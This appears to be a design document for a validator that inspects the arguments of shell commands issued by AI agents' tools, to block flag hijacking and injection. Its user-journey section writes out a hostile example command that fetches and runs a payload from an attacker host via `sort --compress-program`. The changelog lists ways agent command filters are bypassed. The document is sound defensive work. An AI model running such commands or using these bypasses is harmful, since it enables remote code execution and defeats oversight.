# Design Doc: Argument-Level Semantic Validator (ALSV)
**Status:** Draft | In Review | Approved
**Created:** 2026-03-24

## 1. Context and Scope
Recent vulnerabilities in OpenClaw (CVE-2026-32000, CVE-2026-22169) have shown that simple binary allowlisting is insufficient to prevent RCE. Attackers can exploit shell-fallback mechanisms or use legitimate binaries (like `sort`) with dangerous flags (like `--compress-program`) to execute unauthorized code. ALSV provides a deep-inspection layer for command arguments.

## 2. Goals & Non-Goals
* **Goals:**
    * Perform real-time, semantic analysis of all arguments passed to command-based tools.
    * Block shell metacharacters (`;`, `&`, `|`, etc.) and dangerous flag patterns.
    * Enforce a "Deny-by-Default" policy for command-line flags on allowlisted binaries.
    * Strictly disable shell fallback in the underlying execution environment.
* **Non-Goals:**
    * Replacing OS-level sandboxing (e.g., gVisor).
    * Validating the internal logic of the binaries themselves.

## 3. Critical User Journey (CUJ)
* **User Persona:** Security-Conscious Developer
* **Primary Goal:** Use the `sort` tool via an agent without risk of `--compress-program` hijacking.
* **The Happy Path (Tasks):**
    1. An agent attempts to call `sort --compress-program="curl http://attacker.com/malware | sh"`.
    2. The request is intercepted by the ALSV middleware.
    3. ALSV identifies the unauthorized flag `--compress-program` based on the binary's security profile.
    4. The tool call is blocked, and a security alert is logged.
    5. The user is notified of the blocked injection attempt.

## 4. Design & Architecture
* **System Flow:**
    * The Command Adapter passes the raw argument list to the ALSV middleware.
    * ALSV uses a "Security Profile" for each binary to validate flags and values.
    * Arguments are escaped using OS-specific logic before being passed to `exec.Command`.
* **APIs / Interfaces:**
    * `ValidateArguments(binaryPath, args)`
    * `RegisterBinaryProfile(binaryPath, profile)`
* **Data Storage/State:** Static security profiles defined in MCP Any configuration.

## 5. Alternatives Considered
* **Full Containerization for Every Tool Call**: Rejected for some environments due to performance overhead, though ALSV works alongside it.
* **Simple String Escaping**: Rejected as it doesn't prevent flag-based hijacking on legitimate binaries.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust):** Enforces least privilege at the argument level.
* **Observability:** Logs all blocked arguments for forensic analysis.

## 7. Evolutionary Changelog
* **2026-03-24:** Initial Document Creation.

### Update: 2026-04-03 - Transitioning to Grammatical Validation
**Context:** Today's market sync revealed that lexical filters for arguments are being bypassed via line continuation and GNU option abbreviation in OpenClaw and Claude Code.
**Architecture Adjustment:**
* Deprecating regex-based flag allowlists.
* Integrating with the Grammatical Command Validator (GCV) to perform AST-based decomposition of arguments before semantic validation.
**Security Impact:** Prevents complex pipeline injection attacks that bypass simple string matching.
